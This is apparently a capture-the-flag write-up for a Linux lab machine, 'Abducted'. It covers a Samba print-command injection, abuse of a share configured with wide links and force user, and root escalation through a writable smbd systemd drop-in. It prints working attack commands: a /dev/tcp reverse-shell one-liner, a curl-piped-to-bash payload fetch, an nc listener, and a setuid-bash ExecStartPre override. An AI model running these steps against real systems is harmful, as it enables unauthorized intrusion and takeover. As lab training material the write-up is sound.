## Overview
Abducted is a medium-difficulty Linux machine built on a misconfigured Samba file/print server. 
A  print-subsystem command injection (CVE-2026-4480) lands the initial foothold, a reused rclone backup password enables lateral movement to scott, who can abuse an smb misconfiguration to pivot to marcus, and polkit-delegated control over the Samba service abused through a systemd drop-in by marcu's assigned group escalates to root.

##  Foothold
First set up a ``` shell.sh ``` file using:
```bash
echo 'sh -i >& /dev/tcp/$IP/$PORT 0>&1' > shell.sh
```
Set up a payload serving Endpoint using a WebServer of your choice:
```bash
python3 -m http.server 8000
```
And finally listen on the interface's tobecalled Port
```bash
sudo nc -lvnp 80
 ```

We then point the exploit to our Server, and make it pipe it into bash for execution
  ```bash
python3 CVE-2026-4480-PoC/exploit.py 10.129.244.177 10.10.16.223 80 -c "curl 10.10.16.223:8000/shell.sh | bash
  ```

**Which gives us a shell:**

![](shell.png)

From the previous Output of the rpcclient commands, we know a user exists within the Samba Config, scott.

We will check for unix-based accounts on the System, which reveals
```bash
cat /etc/passwd
--- Snip ---
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```
Two Users, noted.

Since Samba is exposed, we can try to look at the SMB configuration.
Taking a look at it, we see that its misconfigured, and allows symlinking files, put on one of the SMB share, to a different user's writeable files.

```bash
nobody@abducted:/etc/samba$ cat shares.conf
cat shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```
As we can see , we need to have a valid user to be able to access the share where the symlink can be executed. 

The technique and the why behind why this file is misconfigured, is explained in the following:
 - ### [smb.conf misconfiguration](https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#wide-links--force-user--write-outside-the-share-as-another-unix-user)

##  Privilege Escalation
Marcus is part of the operators group, after carefull enumeration, and a lot of potential vulnerable paths, the one that stood out the most, is that marcus group "operators", has a **custom polkit rule** that allows him to use **systemctl** and restart specific services.

We thus check for writeable files in the ```/etc/systemd/``` directory, that are either grop owned, writeable, or both.

And find the following directory being writeable:
```bash 
marcus@abducted:/etc/systemd$ find /etc/systemd/ -type d -writable 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:/etc/systemd$ find /etc/systemd/ -type f -writable 2>/dev/null
marcus@abducted:/etc/systemd$ find /etc/systemd/  -writable 2>/dev/null
/etc/systemd/system/systemd-networkd-wait-online.service
/etc/systemd/system/systemd-networkd.service
/etc/systemd/system/smbd.service.d
/etc/systemd/system/samba-ad-dc.service
/etc/systemd/system-generators/systemd-gpt-auto-generator
marcus@abducted:/etc/systemd$ find /etc/systemd/  -writable -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:/etc/systemd$ ls -la /etc/systemd/system/smbd.service.d/
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```
**So basically:**
```bash
/etc/systemd/system/smbd.service.d/
```

We call this a ***drop-in directory.***
The smbd.service.d drop-in directory is group-owned by operators. so marcus can write a drop-in file into it. 

A separate custom polkit rule authorizes operators to systemctl restart smbd.  We drop an override.conf adding a root-run ExecStartPre= hook, then daemon-reload and restart smbd which results in our RCE

![](smbd.png)

```bash 
vi /etc/systemd/system/smbd.service.d/override.conf 
  
  [Service]
  ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
  
systemctl daemon-reload
systemctl restart smbd
```

Resulting in obtaining root:
```bash 
marcus@abducted:/etc/systemd$ /bin/bash -p
bash-5.2# whoami
root
```

### Takeaways:

We take away a few things from Abducted. The foothold comes from Samba throwing a print-job name into a shell unescaped, so the filename itself becomes vulnerable,  reminder that any % substitution in a service config is an injection risk and filenames are vuln inputs.
   
 We also take away the way shares can be misconfigured, allowing us to write into places where we shouldn't have been able to. 
Wide links and force user let us step outside the share root and drop a file into another user's home as that user, which is all it takes to place our own SSH key into the .ssh/authorized_keys file.

Finally, systemd drop-in directories and how to abuse them. We learn that a unit is never just its .service file, systemd also merges every *.conf from the matching .d/ directory on top of it, so write access to that directory is like owning the unit. Once we can drop an override.conf with a root-run ExecStartPre, we essentialy gain RCE within the Units context (root)
